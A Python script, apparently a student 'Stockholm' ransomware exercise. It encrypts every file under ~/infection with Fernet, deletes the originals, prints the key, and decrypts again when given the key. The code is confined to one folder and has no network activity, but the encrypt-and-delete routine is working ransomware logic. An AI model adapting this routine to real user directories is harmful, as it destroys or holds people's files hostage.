import os
import sys
import argparse
from cryptography.fernet import Fernet



def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(file_path + '.ft', 'wb') as file:
        file.write(encrypted_data)
        os.remove(file_path)

def decrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file_path[:-3], 'wb') as file:
        file.write(decrypted_data)
        os.remove(file_path)
def process_files(folder_path, key, mode, silent):
    for root, _, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            if mode == 'encrypt':
                if not file.endswith('.ft'):
                    if not silent:
                        print(f'Encrypting {file_path}')
                    encrypt_file(file_path, key)
            elif mode == 'decrypt':
                if file.endswith('.ft'):
                    if not silent:
                        print(f'Decrypting {file_path}')
                    decrypt_file(file_path, key)

def main(args):
    parser = argparse.ArgumentParser(description='Stockholm program')
    parser.add_argument('-r', '--reverse', metavar='KEY', help='Revert the infection with the provided key')
    parser.add_argument('-s', '--silent', action='store_true', help='No output')
    parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0')
    parsed_args = parser.parse_args(args)

    folder_path = os.path.join(os.path.expanduser('~'), 'infection')
    if not os.path.exists(folder_path):
        print(f'Folder {folder_path} not found')
        return

    if parsed_args.reverse:
        process_files(folder_path, parsed_args.reverse.encode(), 'decrypt', parsed_args.silent)
    else:
        key = generate_key()
        print(f'Encryption key: {key.decode()}')
        process_files(folder_path, key, 'encrypt', parsed_args.silent)

if __name__ == '__main__':
    main(sys.argv[1:])